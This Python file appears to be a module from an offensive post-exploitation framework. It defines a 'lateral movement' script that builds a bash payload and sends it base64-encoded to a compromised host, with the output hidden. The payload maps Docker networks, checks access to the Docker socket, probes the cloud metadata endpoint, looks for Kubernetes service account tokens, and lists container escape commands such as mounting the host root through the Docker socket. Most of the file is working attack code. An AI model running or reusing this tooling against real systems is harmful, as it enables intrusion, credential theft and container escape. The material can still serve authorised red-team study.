"""Docker container network scanning script."""

from ..base import OperatorScript, ScriptResult


class DockerNetworkScan(OperatorScript):
    """Scan Docker container networks for lateral movement opportunities."""
    
    name = "Docker Network Scan"
    description = "Scan Docker container networks"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] DOCKER NETWORK SCAN"
echo "======================"
echo ""

echo "[+] Detecting Docker environment:"
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo "[+] Running inside Docker container"
else
    echo "[-] Not inside Docker container"
fi
echo ""

echo "[+] Docker network interfaces:"
ip addr show 2>/dev/null | grep -E "eth|docker"
echo ""

echo "[+] Docker network routing:"
ip route 2>/dev/null
echo ""

echo "[+] Checking for Docker socket access:"
if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket found: /var/run/docker.sock"
    ls -la /var/run/docker.sock
    
    if command -v docker &>/dev/null; then
        echo "[*] Docker CLI available"
        docker ps 2>/dev/null
        docker network ls 2>/dev/null
    fi
else
    echo "[-] Docker socket not accessible"
fi
echo ""

echo "[+] Scanning Docker bridge network:"
DOCKER_SUBNET=$(ip route | grep docker | head -1 | awk '{print $1}')
if [ ! -z "$DOCKER_SUBNET" ]; then
    echo "[*] Docker subnet: $DOCKER_SUBNET"
    
    BASE_IP=$(echo $DOCKER_SUBNET | cut -d. -f1-3)
    echo "[*] Scanning hosts in $BASE_IP.0/24"
    
    for i in {1..10}; do
        ping -c 1 -W 1 $BASE_IP.$i &>/dev/null && echo "[+] $BASE_IP.$i is up"
    done
else
    echo "[-] No Docker subnet detected"
fi
echo ""

echo "[+] Container metadata service (if on cloud):"
timeout 2 curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && \
    echo "[!] Metadata service accessible!" || \
    echo "[-] No metadata service"
echo ""

echo "[+] Kubernetes service discovery:"
if [ ! -z "$KUBERNETES_SERVICE_HOST" ]; then
    echo "[!] Kubernetes environment detected"
    echo "    K8s API: $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
    
    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo "[!] Service account token found"
        ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    fi
else
    echo "[-] Not in Kubernetes"
fi
echo ""

echo "[+] Docker escape techniques:"
echo "  1. Docker socket: docker run -v /:/host -it ubuntu chroot /host bash"
echo "  2. Privileged container: fdisk -l (check for host disks)"
echo "  3. Capabilities: check for CAP_SYS_ADMIN"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Scanning Docker network...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Docker network scan executed",
                metadata={"script": "docker_network_scan"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
